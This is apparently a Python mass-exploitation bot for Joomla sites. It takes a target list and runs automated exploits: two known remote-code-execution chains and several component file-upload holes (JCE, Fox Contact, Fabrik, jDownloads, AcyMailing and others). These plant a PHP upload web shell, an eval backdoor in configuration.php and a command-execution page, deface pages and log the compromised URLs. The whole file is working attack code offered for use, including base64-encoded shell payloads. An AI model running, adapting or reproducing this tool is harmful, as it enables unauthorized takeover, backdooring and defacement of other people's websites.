try:
	import requests,re
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
shell = """<!DOCTYPE html>
<html>
<head>
  <title>Hacked By Salahdin1337</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Hacked By Salahdin1337</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "./";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>"""
from os import system,mkdir,name
def clear():
	system(['clear','clear'][(name == 'nt')])
clear()
red = '\x1b[1;31m'
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
def SpeedX(check,list,th):
	if xxx == True:
		try:
			with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
				executor.map(check,list)
		except Exception as e:
			print(e)
	else:
		pool = ThreadPool(int(th))
		pool.map(check,list)
		pool.close()
		pool.join()
def Ret(x):
	try:
		return raw_input(x)
	except:
		return input(x)
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def rez(url,exploit,n):
	if "|" in exploit:
		arr = exploit.split("|")
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+arr[0]+": "+w+url+y+" | "+arr[1].strip()+" | "+arr[2].strip()+r+" [NO]")
	else:
		if n == "1":
			print(w+" ["+g+"+"+w+"] "+g+exploit+": "+w+url+g+" [YES]")
		else:
			print(w+" ["+r+"+"+w+"] "+r+exploit+": "+w+url+r+" [NO]")
#3x RCE JOOMLA
backdoor_param = 'vuln@123'
def get_cook(url):
	try:
		try:
			req= requests.get('http://'+url,headers=headers,timeout=20,verify=False)
		except:
		      req= requests.get('http://'+url,headers=headers,timeout=20,verify=False)
		if len(req.cookies) != 0:
			return req.cookies
	except:
		pass
def make_req(url, object_payload):
	try:
		cook = get_cook(url)
		csrf = ''
		user_payload = '\\0\\0\\0' * 9
		padding = 'AAA'
		inj_object = '";'
		inj_object += object_payload
		inj_object += 's:6:"return";s:102:'
		password_payload = padding + inj_object
		params = {'username': user_payload,
		'password': password_payload,
		'option': 'com_users',
		'task': 'user.login',
		csrf: '1'
		}
		try:
			req = requests.post('http://'+url,cookies=cook,data=params,headers=headers,timeout=20,verify=False)
		except:
			req = requests.post('http://'+url,cookies=cook,data=params,headers=headers,timeout=20,verify=False)
		return req.content.decode("utf-8")
	except:
		pass
def get_backdoor_pay():
	try:
		function = 'assert'
		template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
		payload = "file_put_contents('configuration.php','if(isset($_POST[\\'" + backdoor_param + "\\'])) eval($_POST[\\'" + backdoor_param + "\\']);', FILE_APPEND) || $a='http://wtf';"
		final = template.replace('PAYLOAD', payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
		return final
	except:
		pass
def execute_backdoor(url, payload_code):
	try:
	   try:
	   	requests.post('http://' + url + '/configuration.php', data={backdoor_param: payload_code},headers=headers,timeout=20,verify=False)
	   except:
	   	requests.post('http://' + url + '/configuration.php', data={backdoor_param: payload_code},headers=headers,timeout=20,verify=False)
	except:
		pass
def ping_backdoor(url, param_name):
	try:
		try:
			req = requests.post('http://'+url+ '/configuration.php',data={param_name: "echo 'Salahdin1337';"},headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			req = requests.post('http://'+url+ '/configuration.php',data={param_name: "echo 'Salahdin1337';"},headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if 'Salahdin1337' in req:
			return True
		rez("http://"+url,"3x RCE","5")
		return False
	except:
		return False
def RCE3X(url):
	try:
		target_url = url + '/index.php/component/users'
		make_req(target_url, get_backdoor_pay())
		if ping_backdoor(url, backdoor_param):
			execute_backdoor(url,"fwrite(fopen('ripon.php','w+'),base64_decode('PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+SGFja2VkIEJ5IFNhbGFoZGluMTMzNzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CiAgPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+CiAgICA8cD5IYWNrZWQgQnkgU2FsYWhkaW4xMzM3PC9wPgogICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9hZGVkX2ZpbGUiPjwvaW5wdXQ+PGJyIC8+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2lucHV0PgogIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cjw/UEhQCiAgaWYoIWVtcHR5KCRfRklMRVNbJ3VwbG9hZGVkX2ZpbGUnXSkpCiAgewogICAgJHBhdGggPSAiLi8iOwogICAgJHBhdGggPSAkcGF0aCAuIGJhc2VuYW1lKCAkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ11bJ25hbWUnXSk7CiAgICBpZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyd0bXBfbmFtZSddLCAkcGF0aCkpIHsKICAgICAgZWNobyAiVGhlIGZpbGUgIi4gIGJhc2VuYW1lKCAkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ11bJ25hbWUnXSkuIAogICAgICAiIGhhcyBiZWVuIHVwbG9hZGVkIjsKICAgIH0gZWxzZXsKICAgICAgICBlY2hvICJUaGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHRoZSBmaWxlLCBwbGVhc2UgdHJ5IGFnYWluISI7CiAgICB9CiAgfQo/Pg=='));")
			execute_backdoor(url, 'system(\'echo "Salahdin1337<br><pre><?php {}(base64_decode("{}")); ?>" > phpinfo.php\');'.format('eval', 'c3lzdGVtKCRfR0VUWyJjbWQiXSk7'))
			try:
				shellcheck = requests.get("http://"+url+"/ripon.php",headers=headers,timeout=20,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get("http://"+url+"/ripon.php",headers=headers,timeout=20,verify=False).content.decode("utf-8")
			try:
				if "Salahdin1337" in shellcheck:
					with open("Shells.txt","a") as wr:
						wr.write("http://"+url+"/ripon.php\n")
					rez("http://"+url+"/ripon.php","ShellUpload","1")
			except:
				pass
		try:
			shellcheck = requests.get("http://"+url+"/phpinfo.php?cmd=ls",headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			shellcheck = requests.get("http://"+url+"/phpinfo.php?cmd=ls",headers=headers,timeout=20,verify=False).content.decode("utf-8")
		try:
			if "Salahdin1337" in shellcheck:
				with open("Shells.txt","a") as wr:
					wr.write("http://"+url+"/phpinfo.php?cmd=ls\n")
				rez("http://"+url+"/phpinfo.php","3X RCE","1")
		except:
			pass
	except:
		pass
#RCE JOOMLA 2015
def generate_payload(php_payload):
	php_payload = 'eval({0})'.format(php_payload)
	terminate = '\xf0\xfd\xfd\xfd'
	exploit_template = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'
	injected_payload = '{};JFactory::getConfig();exit'.format(php_payload)
	exploit_template += 's:{0}:"{1}"'.format(str(len(injected_payload)),injected_payload)
	exploit_template += ';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}'+terminate
	return exploit_template
def RCE2015(site):
	try:
		pl = generate_payload("base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3JpcG9uLnBocCIgOwokZnA9Zm9wZW4oIiRjaGVjayIsIncrIik7CmZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgnUENGRVQwTlVXVkJGSUdoMGJXdytDanhvZEcxc1BnbzhhR1ZoWkQ0S0lDQThkR2wwYkdVK1NHRmphMlZrSUVKNUlGTmhiR0ZvWkdsdU1UTXpOend2ZEdsMGJHVStDand2YUdWaFpENEtQR0p2WkhrK0NpQWdQR1p2Y20wZ1pXNWpkSGx3WlQwaWJYVnNkR2x3WVhKMEwyWnZjbTB0WkdGMFlTSWdZV04wYVc5dVBTSWlJRzFsZEdodlpEMGlVRTlUVkNJK0NpQWdJQ0E4Y0Q1SVlXTnJaV1FnUW5rZ1UyRnNZV2hrYVc0eE16TTNQQzl3UGdvZ0lDQWdQR2x1Y0hWMElIUjVjR1U5SW1acGJHVWlJRzVoYldVOUluVndiRzloWkdWa1gyWnBiR1VpUGp3dmFXNXdkWFErUEdKeUlDOCtDaUFnSUNBOGFXNXdkWFFnZEhsd1pUMGljM1ZpYldsMElpQjJZV3gxWlQwaVZYQnNiMkZrSWo0OEwybHVjSFYwUGdvZ0lEd3ZabTl5YlQ0S1BDOWliMlI1UGdvOEwyaDBiV3crQ2p3L1VFaFFDaUFnYVdZb0lXVnRjSFI1S0NSZlJrbE1SVk5iSjNWd2JHOWhaR1ZrWDJacGJHVW5YU2twQ2lBZ2V3b2dJQ0FnSkhCaGRHZ2dQU0FpTGk4aU93b2dJQ0FnSkhCaGRHZ2dQU0FrY0dGMGFDQXVJR0poYzJWdVlXMWxLQ0FrWDBaSlRFVlRXeWQxY0d4dllXUmxaRjltYVd4bEoxMWJKMjVoYldVblhTazdDaUFnSUNCcFppaHRiM1psWDNWd2JHOWhaR1ZrWDJacGJHVW9KRjlHU1V4RlUxc25kWEJzYjJGa1pXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRMQ0FrY0dGMGFDa3BJSHNLSUNBZ0lDQWdaV05vYnlBaVZHaGxJR1pwYkdVZ0lpNGdJR0poYzJWdVlXMWxLQ0FrWDBaSlRFVlRXeWQxY0d4dllXUmxaRjltYVd4bEoxMWJKMjVoYldVblhTa3VJQW9nSUNBZ0lDQWlJR2hoY3lCaVpXVnVJSFZ3Ykc5aFpHVmtJanNLSUNBZ0lIMGdaV3h6WlhzS0lDQWdJQ0FnSUNCbFkyaHZJQ0pVYUdWeVpTQjNZWE1nWVc0Z1pYSnliM0lnZFhCc2IyRmthVzVuSUhSb1pTQm1hV3hsTENCd2JHVmhjMlVnZEhKNUlHRm5ZV2x1SVNJN0NpQWdJQ0I5Q2lBZ2ZRby9QZz09JykpOwpmY2xvc2UoJGZwKTsKJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy9yaXBvbi5waHAiIDsKJGZwMj1mb3BlbigiJGNoZWNrMiIsIncrIik7CmZ3cml0ZSgkZnAyLGJhc2U2NF9kZWNvZGUoJ1BDRkVUME5VV1ZCRklHaDBiV3crQ2p4b2RHMXNQZ284YUdWaFpENEtJQ0E4ZEdsMGJHVStTR0ZqYTJWa0lFSjVJRk5oYkdGb1pHbHVNVE16Tnp3dmRHbDBiR1UrQ2p3dmFHVmhaRDRLUEdKdlpIaytDaUFnUEdadmNtMGdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0lnWVdOMGFXOXVQU0lpSUcxbGRHaHZaRDBpVUU5VFZDSStDaUFnSUNBOGNENUlZV05yWldRZ1Fua2dVMkZzWVdoa2FXNHhNek0zUEM5d1Bnb2dJQ0FnUEdsdWNIVjBJSFI1Y0dVOUltWnBiR1VpSUc1aGJXVTlJblZ3Ykc5aFpHVmtYMlpwYkdVaVBqd3ZhVzV3ZFhRK1BHSnlJQzgrQ2lBZ0lDQThhVzV3ZFhRZ2RIbHdaVDBpYzNWaWJXbDBJaUIyWVd4MVpUMGlWWEJzYjJGa0lqNDhMMmx1Y0hWMFBnb2dJRHd2Wm05eWJUNEtQQzlpYjJSNVBnbzhMMmgwYld3K0Nqdy9VRWhRQ2lBZ2FXWW9JV1Z0Y0hSNUtDUmZSa2xNUlZOYkozVndiRzloWkdWa1gyWnBiR1VuWFNrcENpQWdld29nSUNBZ0pIQmhkR2dnUFNBaUxpOGlPd29nSUNBZ0pIQmhkR2dnUFNBa2NHRjBhQ0F1SUdKaGMyVnVZVzFsS0NBa1gwWkpURVZUV3lkMWNHeHZZV1JsWkY5bWFXeGxKMTFiSjI1aGJXVW5YU2s3Q2lBZ0lDQnBaaWh0YjNabFgzVndiRzloWkdWa1gyWnBiR1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtaV1JmWm1sc1pTZGRXeWQwYlhCZmJtRnRaU2RkTENBa2NHRjBhQ2twSUhzS0lDQWdJQ0FnWldOb2J5QWlWR2hsSUdacGJHVWdJaTRnSUdKaGMyVnVZVzFsS0NBa1gwWkpURVZUV3lkMWNHeHZZV1JsWkY5bWFXeGxKMTFiSjI1aGJXVW5YU2t1SUFvZ0lDQWdJQ0FpSUdoaGN5QmlaV1Z1SUhWd2JHOWhaR1ZrSWpzS0lDQWdJSDBnWld4elpYc0tJQ0FnSUNBZ0lDQmxZMmh2SUNKVWFHVnlaU0IzWVhNZ1lXNGdaWEp5YjNJZ2RYQnNiMkZrYVc1bklIUm9aU0JtYVd4bExDQndiR1ZoYzJVZ2RISjVJR0ZuWVdsdUlTSTdDaUFnSUNCOUNpQWdmUW8vUGc9PScpKTsKZmNsb3NlKCRmcDIpOw==')")
		headers1 = {'User-Agent': pl}
		try:
			cookies = requests.get('http://'+site,headers=headers,timeout=20,verify=False).cookies
		except:
			cookies = []
		try:
			req = requests.get('http://'+site+ '/',headers=headers1,cookies=cookies,timeout=20,verify=False)
		except:
		      req = requests.get('http://'+site+ '/',headers=headers1,cookies=cookies,timeout=20,verify=False)
		if req:
			try:
				shellcheck = requests.get('http://'+site+'/images/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get('http://'+site+'/images/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
			try:
				if "Salahdin1337" in shellcheck:
					with open("Shells.txt","a") as wr:
						wr.write('http://'+site+'/images/ripon.php\n')
					rez('http://'+site+'/images/ripon.php',"ShellUpload","1")
				else:
					try:
						shellcheck = requests.get('http://'+site+ '/tmp/ripon.php',headers=headers,timeout=20,verify=False).decode("utf-8")
					except:
						shellcheck = requests.get('http://'+site+'/tmp/ripon.php',headers=headers,timeout=20,verify=False).decode("utf-8")
					if "Salahdin1337" in shellcheck:
						with open("Shells.txt","a") as wr:
							wr.write('http://'+site+'/tmp/ripon.php\n')
						rez('http://'+site+'/tmp/ripon.php','ShellUpload','1')
					else:
						rez("http://"+site,"RCE2015","5")
			except:
				pass
	except:
		pass
#com_media
def com_media(site):
	sess = requests.session()
	try:
		try:
			req = sess.get('http://'+site+'/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=',headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			req = sess.get('http://'+site+'/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=',headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if 'task=file.upload' in req:
			try:
				action = re.findall('action="(.*)" id="uploadForm"',req)[0]
				action = action.replace('http://', '')
				action = action.replace('https://', '')
				files = {'Filedata[]': ('ripon.txt','Hacked By Salahdin1337','text/plain')}
				try:
					sess.post('http://'+action,files=files,headers=headers,timeout=20,verify=False)
				except:
					sess.post('http://'+action,files=files,headers=headers,timeout=20,verify=False)
				try:
					checkshell = requests.get('http://'+site+'/images/ripon.txt',headers=headers,timeout=20,verify=False).content.decode("utf-8")
				except:
					checkshell = requests.get('http://'+site+'/images/ripon.txt',headers=headers,timeout=20,verify=False).content.decode("utf-8")
				if 'Salahdin1337' in checkshell:
					with open('index.txt', 'a') as wr:
						wr.write('http://'+site+'/images/ripon.txt\n')
					rez('http://'+site+'/images/ripon.txt','Defaced','1')
			except:
				pass
		else:
			rez('http://'+site,'Com_Media','y1')
	except:
		pass	
#com_jdownloads
def com_jdownloads(site):
	try:
		files = {'file_upload': ('pwn.zip',open('pwn.zip', 'rb'), 'multipart/form-data'),'pic_upload': ('ripon.php',shell,'multipart/form-data')}
		data = {
		'name': 'ur name',
		'mail': 'rm2174714@gmail.com',
		'catlist': '1',
		'filetitle': 'lolz',
		'description': '<p>zot</p>',
		'2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
		'send': 1,
		'senden': 'Send file',
		'description': '<p>Hacked By Salahdin1337</p>',
		'option': 'com_jdownloads',
		'view': 'upload'
		}
		try:
			req = requests.post('http://'+site+'/index.php?option=com_jdownloads&Itemid=0&view=upload',files=files,data=data,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			req = requests.post('http://'+site+'/index.php?option=com_jdownloads&Itemid=0&view=upload',files=files,data=data,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if '/upload_ok.png' in req:
			try:
				checkshell = requests.get('http://'+site +'/images/jdownloads/screenshots/ripon.php',headers=headers,timeout=20,verify=False).content.decode('utf-8')
			except:
				checkshell = requests.get('http://'+site +'/images/jdownloads/screenshots/ripon.php',headers=headers,timeout=20,verify=False).content.decode('utf-8')
			if 'Salahdin1337' in checkshell:
				with open("Shells.txt","a") as wr:
					wr.write('http://'+site +'/images/jdownloads/screenshots/ripon.php\n')
				rez('http://'+site +'/images/jdownloads/screenshots/ripon.php',"ShellUpload","1")
			else:
				rez("http://"+site,"Com_Jdownloads","6")
		else:
			rez("http://"+site,"Com_Jdownloads","6")
	except:
		pass
#com_farbik
def com_farbik(site):
	try:
		files = {'userfile': ("ripon.php", shell, 'text/csv')}
		data = {
		"name": "ripon.php",
		"drop_data": "1",
		"overwrite": "1",
		"field_delimiter": ",",
		"text_delimiter": "&quot;",
		"option": "com_fabrik",
		"controller": "import",
		"view": "import",
		"task": "doimport",
		"Itemid": "0",
		"tableid": "0"}
		try:
			requests.post("http://"+site+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1',data=data,files=files,timeout=20,verify=False)
		except:
			requests.post("http://"+site+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1',data=data,files=files,timeout=20,verify=False)
		try:
			checkshell = requests.get('http://'+site+"/media/ripon.php",headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			checkshell = requests.get('http://'+site+"/media/ripon.php",headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if "Salahdin1337" in checkshell:
			with open("Shells.txt","a") as wr:
				wr.write('http://'+site+"/media/ripon.php\n")
		else:
			rez('http://'+site,'Com_Farbik','5')
	except:
		pass
#com_acym
def com_acym_image(url):
	files2={"file":("ripon.jpg",open("vuln.gif","rb").read(), "image/jpeg")}
	try:
		try:
			exploit = requests.post("http://"+url,data=data,files=files2,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			exploit = requests.post("http://"+url,data=data,files=files2,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if "ripon" in exploit:
			try:
				js = json.loads(exploit)
				if js.get("url"):
					path = js["url"]
				if js.get("extension"):
					path = path+"."+js["extension"]
			except:
				path = exploit
			rez(path,"Defaced","1")
			try:
				open("index.txt","a").write(path+"\n")
			except:
				pass
		else:
			rez(url,"Com_Acym","b1")
	except:
		rez(url,"Com_Acym","b1")
def com_acym(url):
	files={"file":("ripon.php", shell, "image/jpeg")}
	try:
		try:
			exploit = requests.post("http://"+url,data=data,files=files,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			exploit = requests.post("http://"+url,data=data,files=files,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if '"type":"error"' in exploit:
			com_acym_image(url)
			return "nop"
		if "ripon" in exploit:
			try:
				js = json.loads(exploit)
				if js.get("url"):
					path = js["url"]
				if js.get("extension"):
					path = path+"."+js["extension"]
					ulll = "Shells.txt"
			except:
				path = exploit
				ulll = "sourcess_error.html"
			rez(path,"ShellUpload","1")
			try:
				open(ulll,"a").write(path+"\n")
			except:
				pass
		else:
			rez(url,"Com_Acym",'no')
	except:
		rez(url,"Com_Acym","no")
# com_gmapfp
def com_gmapfp(site):
	try:
		extension = ['ripon.pHP2','ripon.php','ripon.phtml','ripon.php5','ripon.php6','ripon.php.jpg','ripon.php.jpeg','ripon.php.png','ripon.php.gif','ripon.phtml.jpg','ripon.php5.jpg','ripon.php6.jpg']
		for ext in extension:
			data = {"option":"com_gmapfp","no_html":"no_html"}
			files = {'image1':(ext,shell,"image/jpeg")}
			try:
				requests.post("http://"+site+"index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=upload_image",data=data,files=files,headers=headers,timeout=20,verify=False)
			except:
				requests.post("http://"+site+"index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=upload_image",data=data,files=files,headers=headers,timeout=20,verify=False)
			try:
				shellcheck = requests.get("http://"+site+"images/gmapfp/"+ext,headers=headers,timeout=20,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get("http://"+site+"images/gmapfp/"+ext,headers=headers,timeout=20,verify=False).content.decode("utf-8")
			if "Salahdin1337" in shellcheck:
				rez(site+"images/gmapfp/"+ext,"ShellUploaded","1")
				with open("Shells.txt",'a') as wr:
					wr.write(site+"images/gmapfp/"+ext+"\n")
				break
				return 0
		rez('http://'+site,'Com_Gmapfp','15')
	except:
		rez('http://'+site,'Com_Gmapfp','15')
#com_jce
def com_jce(site):
	try:
		files = {'Filedata': ('ripon.php',shell,"text/html")}
		post_data = {'upload-dir': '/','upload-overwrite': '0','action': 'upload'}
		try:
			req = requests.post('http://'+site+ '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form',files=files,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		except:
			req = requests.post('http://'+site+ '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form',files=files,headers=headers,timeout=20,verify=False).content.decode("utf-8")
		if  '"text":"'+"ripon.php" in req:
			data = {'json': '{"fn":"folderRename","args":["/' +'ripon.php'+ '","./../../images/ripon.php"]}'}
			try:
				requests.post('http://'+site+ '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw',data=data,headers=headers,timeout=20,verify=False)
			except:
				requests.post('http://'+site+ '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw',data=data,headers=headers,timeout=20,verify=False)
			try:
				shellcheck = requests.get('http://'+site+'/images/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
			except:
				shellcheck = requests.get('http://'+site+'/images/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
			if 'Salahdin1337' in shellcheck:
				with open('Shells.txt', 'a') as wr:
					wr.write(site+'/images/ripon.php'+'\n')
					rez(site+'/images/ripon.php','ShellUploaded','1')
			else:
				rez(site+'/images/ripon.php','ShellUploaded','1v')
		else:
			rez(site,'Com_JCE','1g')
	except:
		rez(site,'Com_JCE','1g')
# com_foxcontact
def com_foxcontact(site):
	try:
		try:
			check = requests.get('http://'+site+'/components/com_foxcontact/foxcontact.php',headers=headers,timeout=20,verify=False)
		except:
			check = requests.get('http://'+site+'/components/com_foxcontact/foxcontact.php',headers=headers,timeout=20,verify=False)
		if 'Restricted access' in check.content.decode("utf-8"):
			try:
				req = requests.get('http://'+site+ '/index.php?option=com_foxcontact&amp;view=invalid',headers=headers,timeout=20,verify=False)
			except:
				req = requests.get('http://'+site+ '/index.php?option=com_foxcontact&amp;view=invalid',headers=headers,timeout=20,verify=False)
			cids = re.findall('foxcontact&amp;Itemid=(.*?)" >',req.content.decode("utf-8"))
			for cid in cids:
				cid = str(cid)
				urls = ['/components/com_foxcontact/lib/file-uploader.php?cid='+cid+'&mid='+cid+'&qqfile=/../../ripon.php','/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid='+cid+'&mid='+cid+'&qqfile=/../../ripon.php','/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='+cid+'&cid='+cid+'&mid='+cid+'&owner=module&id='+cid+'&qqfile=/../../ripon.php','/components/com_foxcontact/lib/uploader.php?cid='+cid+'&mid='+cid+'&qqfile=/../../ripon.php']
				for path in urls:
					try:
						requests.post('http://'+site+path,data=shell,headers=headers,timeout=20,verify=False)
					except:
						requests.post('http://'+site+path,data=shell,headers=headers,timeout=20,verify=False)
					try:
						checkshellupload = requests.get('http://'+site+'/components/com_foxcontact/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
					except:
						checkshellupload = requests.get('http://'+site+'/components/com_foxcontact/ripon.php',headers=headers,timeout=20,verify=False).content.decode("utf-8")
					if "Salahdin1337" in checkshellupload:
						rez('http://'+site+'/components/com_foxcontact/ripon.php','UploadShell','1')
						with open("Shells.txt","a") as wr:
							wr.write('http://'+site+'/components/com_foxcontact/ripon.php\n')
						break
						return 0
				rez('http://'+site+'/components/com_foxcontact/ripon.php','UploadShell','1b')
		else:
			rez("http://"+site,"Com_Foxcontact","b")
	except Exception as e:
		pass
def cms(site):
	paths = ['/administrator/help/en-GB/toc.json','/administrator/language/en-GB/install.xml','/plugins/system/debug/debug.xml','/administrator/']
	for path in paths:
		try:
			try:
				req = requests.get("http://"+site+path,headers=headers,timeout=25,verify=False).content.decode("utf-8")
			except:
				req = requests.get("http://"+site+path,headers=headers,timeout=25,verify=False).content.decode("utf-8")
			if '"COMPONENTS_BANNERS_BANNERS"' in req:
				return 'joomla'
			elif '<author>Joomla!' in r:
				return 'joomla'
			else:
				return rez("http://"+site,"CMSDetect","5")
		except:
			pass
def Exploit(site):
	try:
		site = site.replace("http://","")
		site = site.replace("https://","")
		if cms(site) == "joomla":
			com_foxcontact(site)
			com_jce(site)
			com_gmapfp(site)
			com_acym(site)
			com_farbik(site)
			com_jdownloads(site)
			com_media(site)
			RCE2015(site)
			RCE3X(site)
	except:
		pass
print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}Joomla-Bot [Normal]\n""".format(y,c,y,c,y,c))
try:
	dorks = Ret(g+" EnterList"+w+":"+c+"~"+m+"# "+r)
	th = Ret(g+" Thread"+w+":"+c+"~"+m+"# "+r)
	dork = open(dorks,"r").read().splitlines()
except Exception as e:
	print(e)
	exit()
SpeedX(Exploit,dork,th)